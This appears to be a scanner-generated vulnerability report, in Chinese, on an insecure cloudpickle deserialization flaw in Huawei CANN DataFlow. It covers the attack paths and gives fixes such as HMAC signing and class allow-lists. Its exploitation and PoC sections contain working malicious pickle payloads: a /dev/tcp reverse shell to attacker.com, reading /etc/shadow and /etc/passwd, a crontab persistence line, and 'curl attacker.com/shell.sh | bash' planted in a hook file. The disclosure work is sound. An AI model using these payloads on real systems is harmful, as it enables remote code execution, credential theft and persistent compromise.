# dflow-pickle-deser-001：cloudpickle反序列化致任意代码执行漏洞

## 概要

| 属性 | 值 |
|-----------|-------|
| **CWE** | CWE-502: 不可信数据反序列化 |
| **严重性** | HIGH/CRITICAL |
| **类型** | 不安全反序列化 |
| **受影响文件** | `dflow/pydflow/python/dataflow/utils/msg_type_register.py:81-84` |
| **函数** | `_deserialize_with_cloudpickle` |
| **漏洞代码** | `cloudpickle.loads(buffer)` |

## 漏洞描述

华为 CANN (Compute Architecture for Neural Networks) DataFlow 框架中的 `MsgTypeRegister` 类使用 `cloudpickle.loads()` 反序列化 Python 对象，无任何验证、签名校验或类型限制。这创建了经典的不安全反序列化漏洞，可导致任意代码执行。

### 漏洞代码

```python
# 文件: msg_type_register.py, 第 81-84 行
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    return cloudpickle.loads(buffer)  # 漏洞: 无验证
```

### 初始化时注册

```python
# 文件: msg_type_register.py, 第 19-22 行
self._registered_msg = {65535: "__PickledMsg__"}
self._registered_clz_to_msg_type = {"__PickledMsg__": 65535}
self._serialize_func = {65535: self._serialize_with_cloudpickle}
self._deserialize_func = {65535: self._deserialize_with_cloudpickle}
```

反序列化器注册为消息类型 **65535** (`MSG_TYPE_PICKLED_MSG`)，这是 DataFlow 框架中默认使用的 pickle 消息类型。

## 攻击路径分析

### 攻击向量 1: 网络消息注入

主要攻击路径涉及通过网络接收的恶意 `FlowMsg` 对象：

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          攻击路径: 网络                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. 外部输入                                                                  │
│     └────────────────────────────────────────────────────┐                  │
│                                                          ▼                  │
│  2. FeedDataFlowGraph / FeedFlowMsg                                         │
│     [dflow_api.cc:273, dflow_session_impl.cc:381]                           │
│     接收包含恶意 pickle 载荷的 FlowMsgPtr                                     │
│                                                          ▼                  │
│  3. FlowFuncProcessor::Proc                                                  │
│     [flow_func_processor.cpp:405-414]                                        │
│     从接收的 mbuf 数据创建 MbufFlowMsg                                        │
│                                                          ▼                  │
│  4. Python 包装器转换                                                         │
│     [pyflow.py:349]                                                          │
│     utils.convert_flow_msg_to_object(ff.FlowMsg(input))                     │
│                                                          ▼                  │
│  5. 反序列化触发                                                              │
│     [utils.py:187-191]                                                       │
│     deserialize_func = get_msg_type_register().get_deserialize_func(        │
│         flow_msg.get_msg_type()  # 对 pickle 消息返回 65535                  │
│     )                                                                         │
│     obj = deserialize_func(flow_msg.get_raw_data())                         │
│                                                          ▼                  │
│  6. 任意代码执行                                                              │
│     [msg_type_register.py:84]                                                │
│     cloudpickle.loads(malicious_buffer)  <-- 此处 RCE                       │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**关键入口点:**
- `dataflow.py:1341`: `session.feed_flow_msg(self._graph_id, indexes, inputs, timeout)`
- `dataflow.py:1382`: `output_object = self._convert_flow_msg_to_object(output)`
- `utils.py:191`: `obj = deserialize_func(flow_msg.get_raw_data())`

### 攻击向量 2: 文件 pickle 加载

通过从工作目录加载的 pickle 文件的次要攻击路径：

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          攻击路径: 文件                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. 恶意 .pkl 文件放置在 WorkPath                                             │
│     - {work_path}/_msg_type_register.pkl                                     │
│     - {work_path}/_env_hook_func.pkl                                         │
│     - {work_path}/{py_clz_name}.pkl                                          │
│                                                          ▼                  │
│  2. tpl_wrapper_code.cpp 初始化                                              │
│     [tpl_wrapper_code.py:253-286]                                            │
│     GetFileBuffer 从 params->GetWorkPath() 读取 .pkl 文件                    │
│                                                          ▼                  │
│  3. 直接反序列化                                                              │
│     [tpl_wrapper_code.py:260-265]                                            │
│     deserialize_func = type_register.attr("get_deserialize_func")(65535)    │
│     type_register = deserialize_func(py::memoryview::from_memory(           │
│         &reg_buf[0], reg_buf.size(), false))  <-- 此处 RCE                   │
│                                                          ▼                  │
│  4. 钩子函数执行                                                              │
│     [tpl_wrapper_code.py:276]                                                │
│     deserialize_func(hook_buffer)()  <-- 立即执行                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**关键文件位置:**
- `{work_path}/_msg_type_register.pkl` - 第 253-267 行加载
- `{work_path}/_env_hook_func.pkl` - 第 269-276 行加载并执行
- `{work_path}/{py_clz_name}.pkl` - 第 279-286 行加载

## 利用演示

### 恶意 Pickle 载荷构造

```python
import cloudpickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # 任意命令执行
        return (os.system, ('id > /tmp/pwned.txt && cat /etc/passwd',))

# 序列化载荷
payload = cloudpickle.dumps(MaliciousPayload())

# 此载荷通过 cloudpickle.loads(payload) 反序列化时
# 将执行: os.system('id > /tmp/pwned.txt && cat /etc/passwd')
```

### 更危险的载荷示例

```python
# 反向 shell
import socket, subprocess, os
class ReverseShell:
    def __reduce__(self):
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
            {'shell': True, 'stdout': subprocess.PIPE}
        ))

# 文件读取窃取
class Exfiltrate:
    def __reduce__(self):
        return (subprocess.check_output, ('cat /etc/shadow', {'shell': True}))

# 持久化机制
class Persistence:
    def __reduce__(self):
        return (os.system, (
            'echo "* * * * * /tmp/malware.sh" | crontab -'
        ))
```

## 影响评估

### 严重性: CRITICAL

**影响类别:**

| 影响 | 描述 |
|--------|-------------|
| **任意代码执行** | 完全控制执行反序列化的 Python 进程 |
| **数据窃取** | 访问进程可读取的所有数据 |
| **权限提升** | 以 dflow 进程的权限执行 |
| **系统攻破** | 可通过反向 shell 或植入程序攻击其他系统 |
| **供应链攻击** | 共享工作空间中的损坏 pickle 文件影响所有用户 |

### 受影响组件

1. **DataFlow 图执行**: 所有接收 pickle 消息的图处理
2. **LLM 数据分发**: `llm_flow_service.cc` 使用 `FeedDataFlowGraph`
3. **用户定义函数**: 从工作目录加载的 Python UDF
4. **多节点部署**: 分布式节点间的网络消息

### 攻击场景

1. **恶意参与者**: 在多节点集群中，被攻破的节点可向其他节点发送恶意 pickle 消息
2. **工作空间污染**: 有 `work_path` 写权限的攻击者可植入恶意 .pkl 文件
3. **中间人攻击**: 如果网络流量未加密，pickle 载荷可在传输中被修改
4. **模型/代码共享**: 共享的 pickle 文件（如用 cloudpickle 序列化的模型权重）可包含隐藏载荷

## 根因分析

漏洞源于：

1. **无验证**: `cloudpickle.loads()` 直接对接收数据调用，无任何检查
2. **无签名**: 无密码学签名验证来认证 pickle 来源
3. **无类型过滤**: 无限制可反序列化的 Python 类型
4. **默认注册**: 消息类型 65535 默认注册，始终可用
5. **信任通道假设**: 代码假设消息/文件仅来自可信源

## PoC

### 网络攻击模拟

```python
# 攻击者代码构造恶意 FlowMsg
import dataflow as df
import cloudpickle
import os

# 初始化 dataflow
df.init({"ge_initialize_type": "3"})

# 创建恶意载荷
class RCEPayload:
    def __reduce__(self):
        return (os.system, ('whoami',))

# 创建 FlowData 并设置恶意 pickle 数据
graph = df.Graph()
input_data = df.FlowData(name="malicious_input")

# 通常通过 feed_dict 设置，关键点是:
# 如果我们能控制 msg_type=65535 的 FlowMsg 中的 raw_data 字节,
# cloudpickle.loads() 将执行任意代码。

# 载荷字节
payload_bytes = cloudpickle.dumps(RCEPayload())

# 如果攻击者控制 msg_type=65535 的网络消息内容:
# utils.py:191 的反序列化将执行载荷
```

### 文件攻击模拟

```bash
# 有 work_path 写权限的攻击者
WORK_PATH="/path/to/workspace/src_python"

# 创建恶意 _env_hook_func.pkl (立即执行)
python3 << 'PYEOF'
import cloudpickle
import os

class HookPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

with open(f"{WORK_PATH}/_env_hook_func.pkl", "wb") as f:
    f.write(cloudpickle.dumps(HookPayload()))
PYEOF

# 当 tpl_wrapper_code.cpp 运行时，第 276 行将执行:
# deserialize_func(hook_buffer)()
# 结果: curl attacker.com/shell.sh | bash 被执行
```

## 修复建议

### 即时缓解措施

1. **禁用 Pickle 反序列化**（如不需要）:
```python
# 移除默认注册
self._deserialize_func = {}  # 不默认注册 cloudpickle
```

2. **添加验证层**:
```python
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    
    # 选项 A: 使用安全 unpickle（需自定义实现）
    # 选项 B: 添加签名验证
    if not self._verify_signature(buffer):
        raise SecurityError("Invalid pickle signature")
    
    return cloudpickle.loads(buffer)
```

3. **限制反序列化来源**:
```python
def get_deserialize_func(self, msg_type):
    # 仅允许来自可信消息类型的反序列化
    if msg_type == 65535 and not self._is_trusted_source():
        return None
    return self._deserialize_func.get(msg_type, None)
```

### 长期修复

1. **使用安全序列化格式**:
   - 用 JSON/MessagePack 替换 cloudpickle 进行数据交换
   - 如必须用 pickle，使用受限 globals 的 `dill`
   - 实现自定义安全反序列化器

2. **实现签名验证**:
```python
import hashlib
import hmac

class SecurePickleDeserializer:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def deserialize(self, signed_buffer):
        # 提取签名和载荷
        signature = signed_buffer[:32]
        payload = signed_buffer[32:]
        
        # 验证 HMAC
        expected_sig = hmac.new(self.secret_key, payload, hashlib.sha256).digest()
        if not hmac.compare_digest(signature, expected_sig):
            raise SecurityError("Invalid signature")
        
        return cloudpickle.loads(payload)
```

3. **白名单允许的类**:
```python
# 使用 RestrictedUnpickler 模式
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        'numpy.ndarray',
        'numpy.dtype',
        # 添加特定允许的类
    }
    
    def find_class(self, module, name):
        full_name = f"{module}.{name}"
        if full_name not in self.ALLOWED_CLASSES:
            raise SecurityError(f"Class {full_name} not allowed")
        return super().find_class(module, name)
```

4. **网络层输入验证**:
   - 在 `FeedDataFlowGraph` 入口点验证消息类型范围
   - 添加消息大小限制
   - 对 pickle 消息实现速率限制

5. **审计和日志**:
```python
def _deserialize_with_cloudpickle(self, buffer):
    import cloudpickle
    import logging
    
    # 记录所有反序列化尝试
    logging.warning(f"Deserializing {len(buffer)} bytes with cloudpickle")
    logging.debug(f"Buffer hash: {hashlib.sha256(buffer).hexdigest()}")
    
    try:
        obj = cloudpickle.loads(buffer)
        logging.info(f"Deserialized object type: {type(obj).__name__}")
        return obj
    except Exception as e:
        logging.error(f"Deserialization failed: {e}")
        raise
```

## 参考资料

- [CWE-502: 不可信数据反序列化](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP 不安全反序列化](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)
- [Python pickle 安全考虑](https://docs.python.org/3/library/pickle.html#security-considerations)
- [cloudpickle 文档](https://github.com/cloudpipe/cloudpickle)

## 结论

这是一个 **已确认、可利用的 CRITICAL 级漏洞**。对不可信数据的 `cloudpickle.loads()` 调用允许以 DataFlow 进程权限执行任意代码。漏洞存在于默认配置中，消息类型 65535 自动注册。

**建议行动**: 立即实现签名验证或迁移到安全序列化格式。在修复前，限制对 DataFlow 端点的网络访问并审计工作目录中的所有 .pkl 文件。

---
*报告由漏洞扫描器生成*
*CWE-502: 不安全反序列化*